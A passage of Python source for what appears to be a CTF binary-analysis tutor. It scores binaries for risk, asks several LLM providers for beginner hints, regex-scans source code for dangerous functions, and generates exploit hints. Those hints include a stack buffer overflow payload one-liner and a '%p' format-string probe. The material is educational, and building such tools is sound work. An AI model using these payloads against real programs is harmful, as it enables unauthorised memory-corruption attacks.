        r'DUCTF\{[^}]+\}',
        r'LACTF\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'0ctf\{[^}]+\}',
        r'rtcp\{[^}]+\}',
        r'[A-Z0-9]{2,8}\{[^}]+\}',
    ]
    combined = re.compile('|'.join(f'({p})' for p in FLAG_PATTERNS))
    matches = []
    for s in strings:
        for m in combined.finditer(s):
            matches.append(m.group())
    return list(dict.fromkeys(matches))  # deduplicate, preserve order


# ---------------------------------------------------------------------------
# Risk scoring
# ---------------------------------------------------------------------------
def calculate_risk_score(
    patterns: dict[str, list[str]],
    flags_detected: list[str],
) -> dict:
    """
    Calculate a confidence/risk score for a binary based on detected patterns
    and flags.

    Returns a dict with:
    • score:   int 0–100
    • level:   "Clean" | "Warning" | "Critical"
    • reasons: list[str] explaining each score contribution
    """
    score = 0
    reasons: list[str] = []

    # +30: dangerous functions (gets, strcpy, system, exec)
    if patterns.get("dangerous_functions"):
        score += 30
        funcs = ", ".join(patterns["dangerous_functions"][:5])
        reasons.append(f"Dangerous functions found: {funcs}")

    # +20: missing stack protection (no __stack_chk_fail)
    if not patterns.get("stack_protection"):
        score += 20
        reasons.append("Stack protection appears missing (no __stack_chk_fail)")

    # +20: flag reads detected (references to flag files)
    if patterns.get("flag_reads"):
        score += 20
        reasons.append(f"Flag file references found ({len(patterns['flag_reads'])} match{'es' if len(patterns['flag_reads']) != 1 else ''})")

    # +15: memory functions (heap vulnerability potential)
    if patterns.get("memory_functions"):
        score += 15
        reasons.append("Heap-related functions detected (malloc/free/realloc — potential heap vulnerability)")

    # +10: file operations
    if patterns.get("file_operations"):
        score += 10
        reasons.append("File I/O operations found (fopen/fread/fclose)")

    # +5: menu-driven (larger attack surface)
    if patterns.get("menu_driven"):
        score += 5
        reasons.append("Menu-driven interface detected (larger attack surface)")

    # +20: actual flags detected in strings
    if flags_detected:
        score += 20
        reasons.append(f"CTF flag format{'s' if len(flags_detected) != 1 else ''} found in strings ({len(flags_detected)} match{'es' if len(flags_detected) != 1 else ''})")

    # Clamp to 100
    score = min(score, 100)

    # Determine level
    if score <= 30:
        level = "Clean"
    elif score <= 60:
        level = "Warning"
    else:
        level = "Critical"

    if not reasons:
        reasons.append("No suspicious patterns detected")

    return {
        "score": score,
        "level": level,
        "reasons": reasons,
    }


# ---------------------------------------------------------------------------
# AI hints (Anthropic Claude)
# ---------------------------------------------------------------------------
def get_ai_hints(
    strings: list[str],
    patterns: dict[str, list[str]],
    writeup_context: str = "",
    ctf_category: dict | None = None,
    checksec: dict | None = None,
    _skip_cache: bool = False,
) -> str:
    """
    Send extracted strings and detected patterns to Claude for beginner-
    friendly CTF hints.  Returns hints as a string.

    Cache Augmented Generation (CAG):
    • Before calling any LLM, checks the hint cache using a key built from
      ctf_category + checksec + top 3 dangerous functions.
    • On cache hit, returns cached hints instantly (zero LLM calls).
    • On cache miss, calls LLM then stores the result.

    Security:
    • Never sends the raw binary — only extracted strings.
    • Caps strings at MAX_STRINGS_FOR_AI to limit token usage.
    • API key is read from the ANTHROPIC_API_KEY env var.
    """
    if _is_testing():
        return (
            "• Run `checksec ./binary` to see protections.\n"
            "• Buffer overflow detected in gets.\n\n"
            "🔗 Kill Chain:\n"
            "• Goal: redirect execution to win.\n"
            "• Exploit path: overflow gets.\n\n"
            "🔥 Try this first: `checksec ./binary`"
        )

    if not ANTHROPIC_API_KEY and not GROQ_API_KEY and not OPENAI_API_KEY and not GEMINI_API_KEY:
        return (
            "AI hints unavailable -- set GROQ_API_KEY, GEMINI_API_KEY, OPENAI_API_KEY, or ANTHROPIC_API_KEY "
            "environment variable to enable AI-powered analysis hints."
        )

    # ── CAG: cache lookup ─────────────────────────────────────────────
    cat = ""
    if ctf_category and ctf_category.get("category"):
        cat = ctf_category["category"]

    cache_key = None
    if not _skip_cache and checksec is not None:
        dangerous_funcs = patterns.get("dangerous_functions", [])
        cache_key = _hint_cache.generate_key(cat or "unknown", checksec, dangerous_funcs)
        cached = _hint_cache.get(cache_key)
        if cached:
            print(f"[CAG] Cache HIT for {cache_key}")
            return cached["hints"]
        print(f"[CAG] Cache MISS — calling LLM for {cache_key}")

    # Build category-aware system prompt
    system_prompt = build_category_aware_prompt(AI_SYSTEM_PROMPT, cat)

    # Build user message with writeup context
    user_message = f"""
Binary analysis:
Strings (first 100): {chr(10).join(strings[:100])}

Detected patterns:
{chr(10).join(f"- {k}: {', '.join(v[:5])}" for k, v in patterns.items())}

{writeup_context}

Give specific actionable CTF hints based on the analysis and any similar writeups above.
Reference specific function names and strings found in this binary.
"""

    ai_messages = [{"role": "user", "content": user_message}]

    result_text = None

    # ── Provider 1: Groq (free, fast) ─────────────────────────────────
    groq_result = _try_groq(messages=ai_messages, system_prompt=system_prompt)
    if groq_result:
        logger.info("[BinExplain] get_ai_hints: Groq succeeded")
        result_text = groq_result

    # ── Provider 2: Nemotron ──────────────────────────────────────────
    if not result_text:
        nemotron_result = _try_nemotron(prompt=ai_messages, system=system_prompt)
        if nemotron_result:
            logger.info("[BinExplain] get_ai_hints: Nemotron succeeded")
            result_text = nemotron_result

    # ── Provider 3: Gemini ────────────────────────────────────────────
    if not result_text:
        gemini_result = _try_gemini(messages=ai_messages, system_prompt=system_prompt)
        if gemini_result:
            logger.info("[BinExplain] get_ai_hints: Gemini succeeded")
            result_text = gemini_result

    # ── Provider 4: OpenAI GPT-4o-mini ────────────────────────────────
    if not result_text:
        openai_result = _try_openai(messages=ai_messages, system_prompt=system_prompt)
        if openai_result:
            logger.info("[BinExplain] get_ai_hints: OpenAI succeeded")
            result_text = openai_result

    # ── Provider 5: Ollama (local) ────────────────────────────────────
    if not result_text:
        ollama_result = _try_ollama(user_message, system_prompt=system_prompt)
        if ollama_result:
            logger.info("[BinExplain] get_ai_hints: Ollama succeeded")
            result_text = ollama_result

    # ── Provider 6: Claude (last resort) ──────────────────────────────
    if not result_text:
        claude_result = _try_claude(messages=ai_messages, system_prompt=system_prompt)
        if claude_result:
            logger.info("[BinExplain] get_ai_hints: Claude succeeded")
            result_text = claude_result

    if not result_text:
        return (
            "AI hints could not be generated -- Groq, Gemini, OpenAI, Ollama, and Claude all failed. "
            "Tip: review the detected patterns above -- look for dangerous "
            "functions (gets, strcpy) and flag-related strings as a starting point."
        )

    # ── CAG: store in cache ───────────────────────────────────────────
    if cache_key and not _skip_cache:
        kill_chain = ""
        if "Kill Chain" in result_text:
            kill_chain = result_text.split("Kill Chain", 1)[1].split("\n\n", 1)[0]
        _hint_cache.set(cache_key, result_text, kill_chain, cat or "unknown")
        print(f"[CAG] Cached result for {cache_key}")

    return result_text


# ---------------------------------------------------------------------------
# Parallel AI inference — async wrappers and merge logic
# ---------------------------------------------------------------------------
def _build_hint_user_message(
    strings: list[str],
    patterns: dict[str, list[str]],
    writeup_context: str = "",
) -> str:
    """Build the user-message prompt for AI hint generation."""
    return f"""
Binary analysis:
Strings (first 100): {chr(10).join(strings[:100])}

Detected patterns:
{chr(10).join(f"- {k}: {', '.join(v[:5])}" for k, v in patterns.items())}

{writeup_context}

Give specific actionable CTF hints based on the analysis and any similar writeups above.
Reference specific function names and strings found in this binary.
"""


async def _try_groq_async(messages: list[dict], system_prompt: str) -> str | None:
    """Async wrapper around _try_groq using a thread pool."""
    loop = asyncio.get_event_loop()
    with concurrent.futures.ThreadPoolExecutor() as pool:
        return await loop.run_in_executor(
            pool, _try_groq, messages, system_prompt
        )


async def _try_nemotron_async(prompt: str | list[dict], system: str) -> str | None:
    """Async wrapper around _try_nemotron using a thread pool."""
    loop = asyncio.get_event_loop()
    with concurrent.futures.ThreadPoolExecutor() as pool:
        return await loop.run_in_executor(
            pool, _try_nemotron, prompt, system
        )


def merge_ai_responses(groq_response: str, nemotron_response: str) -> str:
    """
    Merge two AI analyses into one coherent response.
    Uses Groq for the merge call (fast). Falls back to simple concatenation.
    """
    if not nemotron_response:
        return groq_response
    if not groq_response:
        return nemotron_response

    merge_system = "You are merging two AI analyses of the same binary into ONE clear response."
    merge_prompt = f"""
Analysis A (fast model):
{groq_response}

Analysis B (deep reasoning model):
{nemotron_response}

Combine these into ONE response.
Keep specific commands and technical details from both.
Keep unique insights from both.
Remove duplicate information.
Format as bullet points, max 5 bullets.
End with one specific actionable command.
"""
    merged = _try_groq(
        messages=[{"role": "user", "content": merge_prompt}],
        system_prompt=merge_system,
    )
    if merged:
        return merged
    return f"{groq_response}\n\n--- Deep analysis added ---\n{nemotron_response}"


async def get_ai_hints_parallel(
    strings: list[str],
    patterns: dict[str, list[str]],
    writeup_context: str = "",
    ctf_category: dict | None = None,
    checksec: dict | None = None,
    _skip_cache: bool = False,
) -> dict:
    """
    Run Groq and Nemotron in PARALLEL for AI hint generation.

    Returns a dict with:
      - quick:    Groq's fast response (or None)
      - enhanced: Nemotron's deep response (or None)
      - merged:   Best combined result
    """
    if _is_testing():
        test_hint = (
            "\u2022 Run `checksec ./binary` to see protections.\n"
            "\u2022 Buffer overflow detected in gets.\n\n"
            "\U0001f517 Kill Chain:\n"
            "\u2022 Goal: redirect execution to win.\n"
            "\u2022 Exploit path: overflow gets.\n\n"
            "\U0001f525 Try this first: `checksec ./binary`"
        )
        return {"quick": test_hint, "enhanced": None, "merged": test_hint}

    if not ANTHROPIC_API_KEY and not GROQ_API_KEY and not OPENAI_API_KEY and not GEMINI_API_KEY:
        no_key_msg = (
            "AI hints unavailable -- set GROQ_API_KEY, GEMINI_API_KEY, "
            "OPENAI_API_KEY, or ANTHROPIC_API_KEY to enable AI-powered analysis hints."
        )
        return {"quick": None, "enhanced": None, "merged": no_key_msg}

    # ── CAG: cache lookup ─────────────────────────────────────────────
    cat = ""
    if ctf_category and ctf_category.get("category"):
        cat = ctf_category["category"]

    cache_key = None
    if not _skip_cache and checksec is not None:
        dangerous_funcs = patterns.get("dangerous_functions", [])
        cache_key = _hint_cache.generate_key(cat or "unknown", checksec, dangerous_funcs)
        cached = _hint_cache.get(cache_key)
        if cached:
            print(f"[CAG] Cache HIT for {cache_key}")
            return {"quick": cached["hints"], "enhanced": None, "merged": cached["hints"]}
        print(f"[CAG] Cache MISS — calling LLMs in parallel for {cache_key}")

    # Build category-aware system prompt
    system_prompt = build_category_aware_prompt(AI_SYSTEM_PROMPT, cat)

    # Build user message
    user_message = _build_hint_user_message(strings, patterns, writeup_context)
    ai_messages = [{"role": "user", "content": user_message}]

    # ── Launch Groq and Nemotron in PARALLEL ──────────────────────────
    print("[BinExplain] Launching parallel AI inference: Groq + Nemotron")
    groq_task = asyncio.create_task(_try_groq_async(ai_messages, system_prompt))
    nemotron_task = asyncio.create_task(_try_nemotron_async(ai_messages, system_prompt))

    groq_result = await groq_task
    if groq_result:
        logger.info("[BinExplain] Parallel hints: Groq succeeded")

    nemotron_result = await nemotron_task
    if nemotron_result:
        logger.info("[BinExplain] Parallel hints: Nemotron succeeded")

    # ── Determine final result ────────────────────────────────────────
    if groq_result and nemotron_result:
        merged = merge_ai_responses(groq_result, nemotron_result)
        result = {"quick": groq_result, "enhanced": nemotron_result, "merged": merged}
    elif groq_result:
        result = {"quick": groq_result, "enhanced": None, "merged": groq_result}
    elif nemotron_result:
        result = {"quick": None, "enhanced": nemotron_result, "merged": nemotron_result}
    else:
        # Both failed — fall back to sequential chain
        logger.info("[BinExplain] Parallel hints: both failed, falling back to sequential")
        fallback = get_ai_hints(
            strings, patterns, writeup_context,
            ctf_category=ctf_category, checksec=checksec,
            _skip_cache=_skip_cache,
        )
        return {"quick": None, "enhanced": None, "merged": fallback}

    # ── CAG: store merged result in cache ─────────────────────────────
    merged_text = result["merged"]
    if cache_key and not _skip_cache and merged_text:
        kill_chain = ""
        if "Kill Chain" in merged_text:
            kill_chain = merged_text.split("Kill Chain", 1)[1].split("\n\n", 1)[0]
        _hint_cache.set(cache_key, merged_text, kill_chain, cat or "unknown")
        print(f"[CAG] Cached parallel result for {cache_key}")

    return result


def _try_groq(messages: list[dict], system_prompt: str) -> str | None:
    """
    Try to generate a response using Groq (llama-3.3-70b-versatile).
    Returns the response text, or None if the call fails.
    Skips if provider is in cooldown. Records cooldown on 429.
    """
    if not GROQ_API_KEY:
        return None
    if not _is_provider_cooled_down("groq"):
        logger.info("Groq skipped (in cooldown)")
        return None
    try:
        client = groq.Groq(api_key=GROQ_API_KEY)
        response = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            max_tokens=1024,
            messages=[
                {"role": "system", "content": system_prompt},
                *messages,
            ],
        )
        text = response.choices[0].message.content
        if text and text.strip():
            logger.info("Groq hint generated with model: llama-3.3-70b-versatile")
            return text.strip()
    except Exception as exc:
        exc_str = str(exc)
        if "429" in exc_str or "rate" in exc_str.lower():
            logger.warning("Groq rate limited (429), recording cooldown: %s", exc)
            _record_provider_cooldown("groq")
        else:
            logger.warning("Groq API call failed: %s", exc)
    return None


def _try_openai(messages: list[dict], system_prompt: str) -> str | None:
    """
    Try to generate a response using OpenAI GPT-4o-mini.
    Returns the response text, or None if the call fails.
    Skips if provider is in cooldown. Records cooldown on 429.
    """
    if not OPENAI_API_KEY:
        return None
    if not _is_provider_cooled_down("openai"):
        logger.info("OpenAI skipped (in cooldown)")
        return None
    try:
        client = openai.OpenAI(api_key=OPENAI_API_KEY)
        response = client.chat.completions.create(
            model="gpt-4o-mini",
            max_tokens=1024,
            messages=[
                {"role": "system", "content": system_prompt},
                *messages,
            ],
        )
        text = response.choices[0].message.content
        if text and text.strip():
            logger.info("OpenAI hint generated with model: gpt-4o-mini")
            return text.strip()
    except Exception as exc:
        exc_str = str(exc)
        if "429" in exc_str or "rate" in exc_str.lower():
            logger.warning("OpenAI rate limited (429), recording cooldown: %s", exc)
            _record_provider_cooldown("openai")
        else:
            logger.warning("OpenAI API call failed (%s): %s", type(exc).__name__, exc)
    return None


def _try_ollama(user_message: str, system_prompt: str | None = None) -> str | None:
    """
    Try to generate hints using a local Ollama instance.
    Attempts models in order: qwen2.5-coder, qwen2.5, qwen3.
    Returns the response text, or None if all models fail.
    """
    prompt_to_use = system_prompt or AI_SYSTEM_PROMPT
    for model in OLLAMA_MODELS:
        try:
            resp = requests.post(
                f"{OLLAMA_BASE_URL}/api/generate",
                json={
                    "model": model,
                    "prompt": user_message,
                    "system": prompt_to_use,
                    "stream": False,
                },
                timeout=120,
            )
            if resp.status_code == 200:
                data = resp.json()
                text = data.get("response", "").strip()
                if text:
                    logger.info("Ollama hint generated with model: %s", model)
                    return text
        except requests.RequestException as exc:
            logger.warning("Ollama model '%s' failed: %s", model, exc)
            continue
    return None


def _try_ollama_chat(messages: list[dict]) -> str | None:
    """
    Try Ollama's multi-turn /api/chat endpoint.
    Attempts models in order: qwen2.5-coder, qwen2.5, qwen3.
    Returns the response text, or None if all models fail.
    """
    for model in OLLAMA_MODELS:
        try:
            resp = requests.post(
                f"{OLLAMA_BASE_URL}/api/chat",
                json={
                    "model": model,
                    "messages": messages,
                    "stream": False,
                },
                timeout=120,
            )
            if resp.status_code == 200:
                data = resp.json()
                text = data.get("message", {}).get("content", "").strip()
                if text:
                    logger.info("Ollama chat generated with model: %s", model)
                    return text
        except requests.RequestException as exc:
            logger.warning("Ollama chat model '%s' failed: %s", model, exc)
            continue
    return None


def _try_gemini(messages: list[dict], system_prompt: str) -> str | None:
    """
    Try to generate a response using Google Gemini.
    Returns the response text, or None if the call fails.
    Skips if provider is in cooldown. Records cooldown on 429.
    """
    global gemini_client
    if not GEMINI_API_KEY:
        return None
    if not gemini_client:
        try:
            gemini_client = genai.Client(api_key=GEMINI_API_KEY)
        except Exception as exc:
            logger.warning("Gemini client initialization failed: %s", exc)
            return None
    if not _is_provider_cooled_down("gemini"):
        logger.info("Gemini skipped (in cooldown)")
        return None
    try:
        # Convert messages to Gemini format using types.Content and types.Part
        gemini_contents = []
        for msg in messages:
            role = "user" if msg["role"] == "user" else "model"
            gemini_contents.append(
                types.Content(
                    role=role,
                    parts=[types.Part.from_text(text=msg["content"])]
                )
            )
        response = gemini_client.models.generate_content(
            model="gemini-2.5-flash",
            contents=gemini_contents,
            config=types.GenerateContentConfig(
                system_instruction=system_prompt,
            ),
        )
        text = response.text
        if text and text.strip():
            logger.info("[BinExplain] Gemini succeeded (gemini-2.5-flash)")
            return text.strip()
    except Exception as exc:
        exc_str = str(exc)
        if "429" in exc_str or "rate" in exc_str.lower() or "resource" in exc_str.lower():
            logger.warning("Gemini rate limited (429), recording cooldown: %s", exc)
            _record_provider_cooldown("gemini")
        else:
            logger.warning("Gemini API call failed: %s", exc)
    return None


def _try_nemotron(prompt: str | list[dict], system: str) -> str | None:
    api_key = os.getenv("OPENROUTER_API_KEY")
    if not api_key:
        return None
    try:
        from openai import OpenAI
        client = OpenAI(
            base_url="https://openrouter.ai/api/v1",
            api_key=api_key
        )
        if isinstance(prompt, list):
            messages = [{"role": "system", "content": system}] + prompt
        else:
            messages = [
                {"role": "system", "content": system},
                {"role": "user", "content": prompt}
            ]
        response = client.chat.completions.create(
            model="nvidia/nemotron-3-ultra-550b-a55b:free",
            messages=messages,
            max_tokens=1000,
            timeout=20
        )
        result = response.choices[0].message.content
        print("[BinExplain AI] Nemotron 3 Ultra succeeded")
        return result
    except Exception as e:
        print(f"[BinExplain AI] Nemotron failed: {e}")
        return None


def _try_claude(messages: list[dict] | str, system_prompt: str, max_tokens: int = 1024) -> str | None:
    """
    Try to generate a response using Anthropic Claude.
    Returns the response text, or None if the call fails.
    """
    if not ANTHROPIC_API_KEY:
        return None
    try:
        client = anthropic.Anthropic(api_key=ANTHROPIC_API_KEY)
        if isinstance(messages, str):
            messages_list = [{"role": "user", "content": messages}]
        else:
            messages_list = messages
        response = client.messages.create(
            model="claude-sonnet-4-20250514",
            max_tokens=max_tokens,
            system=system_prompt,
            messages=messages_list,
        )
        text = response.content[0].text
        if text and text.strip():
            logger.info("[BinExplain] Claude succeeded (claude-sonnet-4-20250514)")
            return text.strip()
    except Exception as exc:
        logger.warning("Anthropic API call failed: %s", exc)
    return None


# ---------------------------------------------------------------------------
# Decompilation hints — AI-powered disassembly explanation
# ---------------------------------------------------------------------------
DECOMPILATION_SYSTEM_PROMPT = (
    "You are a reverse engineering mentor helping a CTF beginner understand "
    "disassembled binary code.\n\n"
    "Given disassembly instructions and extracted strings from a binary, explain:\n"
    "1. What each function likely does based on the assembly patterns and strings.\n"
    "2. Key observations about the control flow (loops, conditionals, function calls).\n"
    "3. What data structures or buffers are being used.\n"
    "4. Any security-relevant patterns (stack operations, function prologues, dangerous calls).\n\n"
    "RULES:\n"
    "• Start with FUNCTION ANALYSIS: on its own line, then • bullet points.\n"
    "• Each • bullet = one observation about the code. Maximum 8 bullets.\n"
    "• Then a blank line, then KEY OBSERVATIONS: with 3-4 • bullets.\n"
    "• Then a blank line, then LIKELY BEHAVIOR: with a 1-2 sentence summary.\n"
    "• NEVER use markdown headers (#), numbered lists, bold (**), or italic (*).\n"
    "• Be specific — reference actual addresses and instructions when possible.\n"
)


def get_decompilation_hints(
    disassembly: list[dict],
    strings: list[str],
    ctf_category: dict | None = None,
) -> str:
    """
    Send disassembly instructions and strings to AI for function-level
    explanations and decompilation-style hints.

    Security:
    • Never sends the raw binary — only disassembly text and strings.
    • Caps data sent to AI to limit token usage.
    • API key is read from env vars.
    """
    if not disassembly:
        return "No disassembly available — decompilation hints require a valid ELF binary."

    if _is_testing():
        return (
            "FUNCTION ANALYSIS:\n"
            "• Main function calls gets.\n\n"
            "KEY OBSERVATIONS:\n"
            "• Buffer overflow vulnerability present.\n\n"
            "LIKELY BEHAVIOR:\n"
            "The program is vulnerable to stack buffer overflow."
        )

    if not ANTHROPIC_API_KEY and not GROQ_API_KEY and not OPENAI_API_KEY:
        return (
            "Decompilation hints unavailable — set ANTHROPIC_API_KEY, GROQ_API_KEY, "
            "or OPENAI_API_KEY to enable AI-powered decompilation analysis."
        )

    # Build category-aware system prompt
    cat = ""
    if ctf_category and ctf_category.get("category"):
        cat = ctf_category["category"]
    system_prompt = build_category_aware_prompt(DECOMPILATION_SYSTEM_PROMPT, cat)

    # Format disassembly as text (cap at 80 instructions)
    disasm_lines = []
    for insn in disassembly[:80]:
        addr = insn.get("address", "")
        mnemonic = insn.get("mnemonic", "")
        op_str = insn.get("op_str", "")
        disasm_lines.append(f"  {addr}:  {mnemonic:8s} {op_str}")
    disasm_text = "\n".join(disasm_lines)

    # Include relevant strings for context (cap at 50)
    strings_text = "\n".join(strings[:50])

    user_message = (
        f"Here is the disassembly of the binary's main function:\n\n"
        f"{disasm_text}\n\n"
        f"Extracted strings from the binary:\n{strings_text}\n\n"
        f"Please explain what each function likely does based on the assembly "
        f"patterns, string references, and calling conventions."
    )

    # Try AI providers (Groq -> Nemotron -> Gemini -> OpenAI -> Ollama -> Claude)
    ai_messages = [{"role": "user", "content": user_message}]

    groq_result = _try_groq(messages=ai_messages, system_prompt=system_prompt)
    if groq_result:
        logger.info("[BinExplain] get_decompilation_hints: Groq succeeded")
        return groq_result

    nemotron_result = _try_nemotron(prompt=ai_messages, system=system_prompt)
    if nemotron_result:
        logger.info("[BinExplain] get_decompilation_hints: Nemotron succeeded")
        return nemotron_result

    gemini_result = _try_gemini(messages=ai_messages, system_prompt=system_prompt)
    if gemini_result:
        logger.info("[BinExplain] get_decompilation_hints: Gemini succeeded")
        return gemini_result

    openai_result = _try_openai(messages=ai_messages, system_prompt=system_prompt)
    if openai_result:
        logger.info("[BinExplain] get_decompilation_hints: OpenAI succeeded")
        return openai_result

    ollama_result = _try_ollama(user_message, system_prompt=system_prompt)
    if ollama_result:
        logger.info("[BinExplain] get_decompilation_hints: Ollama succeeded")
        return ollama_result

    claude_result = _try_claude(messages=ai_messages, system_prompt=system_prompt)
    if claude_result:
        logger.info("[BinExplain] get_decompilation_hints: Claude succeeded")
        return claude_result

    return (
        "Decompilation hints could not be generated -- all AI providers failed. "
        "Review the disassembly manually: look for call instructions, stack "
        "allocations (sub rsp), and string references."
    )


# ---------------------------------------------------------------------------
# Source code analysis
# ---------------------------------------------------------------------------
# Dangerous function patterns by language family
_DANGEROUS_PATTERNS: dict[str, list[tuple[str, str]]] = {
    "all": [
        (r'(?i)(password|passwd|secret|api_key|apikey)\s*=\s*["\'][^"\']*["\']', "Hardcoded credential (password=, secret=, api_key=)"),
        (r'(?i)(SELECT|INSERT|UPDATE|DELETE).*(execute|query)', "SQL injection pattern (SELECT, INSERT, execute, query)"),
        (r'(?i)(os\.system|subprocess|eval|exec)\s*\(', "Command injection pattern (os.system, subprocess, eval, exec)"),
    ],
    "c": [
        (r'\bgets\s*\(', "gets() — unbounded read, classic buffer overflow"),
        (r'\bstrcpy\s*\(', "strcpy() — no bounds check, can overflow destination"),
        (r'\bstrcat\s*\(', "strcat() — no bounds check on concatenation"),
        (r'\bsprintf\s*\(', "sprintf() — no bounds check on formatted output"),
        (r'\bscanf\s*\(\s*"%s"', "scanf(\"%s\") — no width limit, buffer overflow"),
        (r'\bsystem\s*\(', "system() — shell command execution, potential injection"),
        (r'\bexecve?\s*\(', "exec() — direct process execution"),
        (r'\bprintf\s*\(\s*[a-zA-Z_]', "printf(var) — possible format string vulnerability"),
        (r'\bmalloc\s*\(.*\)\s*;(?!.*if)', "malloc() — unchecked return value (possible NULL deref)"),
        (r'\bfree\s*\(', "free() — check for double-free or use-after-free"),
    ],
    "python": [
        (r'\beval\s*\(', "eval() — arbitrary code execution from user input"),
        (r'\bexec\s*\(', "exec() — arbitrary code execution"),
        (r'\b__import__\s*\(', "__import__() — dynamic import, potential code injection"),
        (r'\bos\.system\s*\(', "os.system() — shell command injection"),
        (r'\bsubprocess\.\w+\s*\(.*shell\s*=\s*True', "subprocess(shell=True) — shell injection"),
        (r'\bpickle\.loads?\s*\(', "pickle.load() — deserialization attack vector"),
        (r'\byaml\.load\s*\((?!.*Loader)', "yaml.load() without SafeLoader — code execution"),
        (r'\binput\s*\(.*\)\s*$', "input() — in Python 2 this executes code"),
    ],
    "javascript": [
        (r'\beval\s*\(', "eval() — arbitrary code execution"),
        (r'\bnew\s+Function\s*\(', "new Function() — dynamic code execution"),
        (r'\bsetTimeout\s*\(\s*["\']', "setTimeout(string) — implicit eval"),
        (r'\binnerHTML\s*=', "innerHTML assignment — XSS vulnerability"),
        (r'\bdocument\.write\s*\(', "document.write() — potential XSS"),
        (r'\b(child_process|exec|spawn)', "child_process — command injection risk"),
    ],
    "rust": [
        (r'\bunsafe\s*\{', "unsafe block — bypasses Rust's memory safety guarantees"),
        (r'\.unwrap\s*\(\s*\)', ".unwrap() — can panic on None/Err, potential DoS"),
        (r'\bstd::process::Command', "Command execution — shell injection risk"),
        (r'\braw\s+pointer', "Raw pointer usage — manual memory management"),
    ],
    "go": [
        (r'\bexec\.Command\s*\(', "exec.Command() — OS command execution"),
        (r'\bunsafe\.Pointer', "unsafe.Pointer — bypasses Go's type safety"),
        (r'\bcgo\b', "CGo — interfacing with C, inherits C's memory unsafety"),
        (r'\bos\.Exec\s*\(', "os.Exec() — replaces current process"),
    ],
}

# Language extension map
_EXT_TO_LANG: dict[str, str] = {
    ".c": "c", ".h": "c", ".cpp": "c", ".hpp": "c", ".cc": "c",
    ".py": "python",
    ".js": "javascript", ".ts": "javascript", ".jsx": "javascript",
    ".rs": "rust",
    ".go": "go",
    ".java": "c",  # Java shares many C-family patterns
}


def _detect_language_from_code(code: str) -> str:
    """
    Heuristically detect the programming language from code content.
    """
    first_lines = code[:2000].lower()
    if "#include" in first_lines or "int main" in first_lines or "void " in first_lines:
        return "c"
    if "def " in first_lines and ("import " in first_lines or "print(" in first_lines):
        return "python"
    if "function " in first_lines or "const " in first_lines or "=>" in first_lines:
        return "javascript"
    if "fn " in first_lines and ("let " in first_lines or "mut " in first_lines):
        return "rust"
    if "func " in first_lines and "package " in first_lines:
        return "go"
    if "class " in first_lines and "public " in first_lines:
        return "c"  # Java / C#
    return "unknown"


def _find_dangerous_functions(code: str, lang: str) -> list[dict]:
    """
    Scan source code for dangerous function patterns.
    Returns list of {function, description, line} dicts.
    """
    patterns = _DANGEROUS_PATTERNS.get(lang, []).copy()
    patterns.extend(_DANGEROUS_PATTERNS.get("all", []))
    if not patterns or len(patterns) == len(_DANGEROUS_PATTERNS.get("all", [])):
        # Try all pattern sets if language unknown
        for k, _patterns in _DANGEROUS_PATTERNS.items():
            if k != "all" and k != lang:
                patterns.extend(_patterns)

    results: list[dict] = []
    lines = code.split("\n")
    seen: set[str] = set()

    for i, line in enumerate(lines, 1):
        stripped = line.strip()
        if stripped.startswith("//") or stripped.startswith("#") or stripped.startswith("*"):
            continue  # skip comments
        for pattern, description in patterns:
            if re.search(pattern, line) and description not in seen:
                results.append({
                    "function": description.split("(")[0].split("—")[0].strip(),
                    "description": description,
                    "line": i,
                })
                seen.add(description)
    return results[:20]  # cap


def _build_structured_vulnerabilities(code: str, dangerous: list[dict], ai_vuln_text: str) -> list[dict]:
    """
    Build structured vulnerability objects from static analysis and AI output.
    Returns list of {"line": N, "type": "buffer_overflow", "description": "...", "severity": "Critical"}.
    """
    vulns: list[dict] = []
    seen: set[str] = set()

    # Map dangerous function patterns to vulnerability types and severities
    vuln_type_map = {
        "gets": ("buffer_overflow", "Critical"),
        "strcpy": ("buffer_overflow", "High"),
        "strcat": ("buffer_overflow", "High"),
        "sprintf": ("buffer_overflow", "High"),
        "scanf": ("buffer_overflow", "High"),
        "system": ("command_injection", "Critical"),
        "exec": ("command_injection", "Critical"),
        "printf(var)": ("format_string", "Critical"),
        "format string": ("format_string", "Critical"),
        "eval": ("code_injection", "Critical"),
        "pickle": ("deserialization", "High"),
        "yaml.load": ("deserialization", "High"),
        "innerHTML": ("xss", "High"),
        "document.write": ("xss", "Medium"),
        "unsafe": ("memory_safety", "High"),
        "malloc": ("memory_corruption", "Medium"),
        "free": ("memory_corruption", "Medium"),
        "Hardcoded credential": ("hardcoded_credential", "High"),
        "SQL injection": ("sql_injection", "Critical"),
        "Command injection": ("command_injection", "Critical"),
    }

    for d in dangerous:
        desc_lower = d["description"].lower()
        vuln_type = "unknown"
        severity = "Medium"
        for pattern, (vtype, sev) in vuln_type_map.items():
            if pattern.lower() in desc_lower:
                vuln_type = vtype
                severity = sev
                break

        key = f"{d['line']}:{vuln_type}"
        if key not in seen:
            seen.add(key)
            vulns.append({
                "line": d["line"],
                "type": vuln_type,
                "description": d["description"],
                "severity": severity,
            })

    return vulns


def _generate_exploit_hints(code: str, dangerous: list[dict], lang: str) -> list[str]:
    """
    Generate specific exploit hints based on detected code patterns.
    """
    hints: list[str] = []
    lines = code.split("\n")

    # Detect buffer sizes from code
    buffer_sizes = _detect_buffer_sizes(code)

    for d in dangerous:
        desc_lower = d["description"].lower()
        line_num = d["line"]
        line_text = lines[line_num - 1].strip() if line_num <= len(lines) else ""

        if "gets" in desc_lower:
            # Find the variable name and buffer size
            var_match = re.search(r'gets\s*\(\s*(\w+)', line_text)
            var_name = var_match.group(1) if var_match else "buffer"
            buf_size = buffer_sizes.get(var_name, None)
            if buf_size:
                hints.append(f"Line {line_num}: gets({var_name}) reads into a {buf_size}-byte buffer with no bounds check. Overflow with {buf_size}+ bytes to corrupt the stack.")
                hints.append(f"Payload: python3 -c 'print(\"A\"*{buf_size} + \"B\"*8)' | ./binary — the 'B's overwrite the return address.")
            else:
                hints.append(f"Line {line_num}: gets({var_name}) has no length limit — send a long input to overflow the buffer and overwrite the return address.")

        elif "strcpy" in desc_lower:
            hints.append(f"Line {line_num}: strcpy() copies without bounds checking. If source is user-controlled, overflow the destination buffer.")

        elif "format string" in desc_lower or "printf" in desc_lower:
            hints.append(f"Line {line_num}: Format string vulnerability — use %p to leak stack addresses, %n to write arbitrary values.")
            hints.append(f"Test: echo '%p.%p.%p.%p' | ./binary — if you see hex addresses, it's exploitable.")

